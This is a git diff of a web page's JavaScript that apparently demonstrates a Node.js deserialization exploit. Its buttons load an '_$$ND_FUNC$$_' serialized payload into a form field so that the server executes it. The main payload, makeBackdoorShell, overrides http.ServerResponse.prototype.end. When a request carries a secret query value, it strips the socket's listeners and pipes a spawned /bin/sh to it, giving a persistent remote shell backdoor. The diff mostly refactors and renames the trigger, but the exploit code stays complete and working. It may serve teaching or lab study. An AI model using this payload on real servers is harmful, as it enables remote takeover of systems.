@@ -39,53 +39,49 @@
 
 <script type="text/javascript">
 
+ function prepToEval ( code ) {
+	 return '_$$ND_FUNC$$_(' + code.toString() + '())';
+ }
+
  $('#setup-back-door')
  .on('click', function ( ) {
-	 var executable = '_$$ND_FUNC$$_(' + makeBackdoorShell.toString() + '())';
-	 console.log(executable);
+	 var executable = prepToEval(makeBackdoorShell);
 	 $('[name="name"]').val(executable);
  });
 
  $('#show-setup-back-door')
  .on('click', (function ( offOn ){
+	 $('#setup-back-door-text').html(makeBackdoorShell.toString());
 	 return function ( ) {
 		 if (offOn) {
-			 $('#setup-back-door-text').html(makeBackdoorShell.toString());
 			 $('#setup-back-door-text').show(); }
-
 		 else {
-			 $('#setup-back-door-text').text('');
 			 $('#setup-back-door-text').hide(); }
-
 		 offOn = offOn ? 0 : 1;
 	 };
  }(1)));
 
  $('#console-log')
  .on('click', function ( ) {
-	 var executable = '_$$ND_FUNC$$_(' + consoleLog.toString() + '())';
-	 console.log(executable);
+	 var executable = prepToEval(consoleLog);
 	 $('[name="name"]').val(executable);
  });
 
  $('#show-console-log')
  .on('click', (function ( offOn ){
+	 $('#console-log-text').html(consoleLog.toString());
 	 return function ( ) {
 		 if (offOn) {
-			 $('#console-log-text').html(consoleLog.toString());
 			 $('#console-log-text').show(); }
-
 		 else {
-			 $('#console-log-text').text('');
 			 $('#console-log-text').hide(); }
-
 		 offOn = offOn ? 0 : 1;
 	 };
  }(1)));
 
  // This is code that just logs to stdout in the server process
  function consoleLog ( ) {
-	 console.log('........\nHello!\n````````');
+	 console.log('........\nHello, Mr/Ms. Server!\n````````');
  }
 
  // This is code that would create a way to
@@ -93,8 +89,8 @@
  function makeBackdoorShell ( ) {
 	 require('http').ServerResponse.prototype.end = (function ( end ) {
 		 return function ( ) {
-			 if (this.socket._httpMessage.req.query.q === 'abc123') {
-
+			 if (this.socket._httpMessage.req.query.open === 'http-shell') {
+				 
 				 console.log('YOU\'RE FUCKED!!!');
 				 console.log('HAHAHAHAHAHAHAHA');
 
@@ -107,6 +103,7 @@
 				  'lookup',
 				  'timeout',
 				  ''].forEach(this.socket.removeAllListeners.bind(this.socket));
+
 				 var cp = require('child_process');
 				 var net = require('net');
 				 var sh = cp.spawn('/bin/sh');
@@ -119,5 +116,4 @@
 		 }
 	 })(require('http').ServerResponse.prototype.end);
  }
- 
 </script>
